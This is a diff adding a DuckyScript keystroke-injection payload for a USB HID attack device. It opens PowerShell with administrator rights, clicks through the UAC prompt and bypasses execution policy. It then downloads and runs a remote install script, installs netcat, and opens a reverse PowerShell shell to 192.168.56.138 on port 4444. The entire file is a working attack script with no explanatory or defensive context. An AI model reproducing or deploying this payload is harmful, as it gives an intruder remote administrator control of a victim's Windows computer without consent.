@@ -1,0 +1,21 @@
+ DELAY 200
+GUI r
+
+DELAY 200
+STRING powershell -NoP -Nonl
+CTRL SHIFT ENTER 
+
+
+DELAY 500
+LEFTARROW
+ENTER
+
+DELAY 500
+STRING Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
+ENTER
+
+DELAY 200
+STRING choco install netcat -y
+ENTER
+ENTER
+STRING nc -e powershell.exe 192.168.56.138 4444
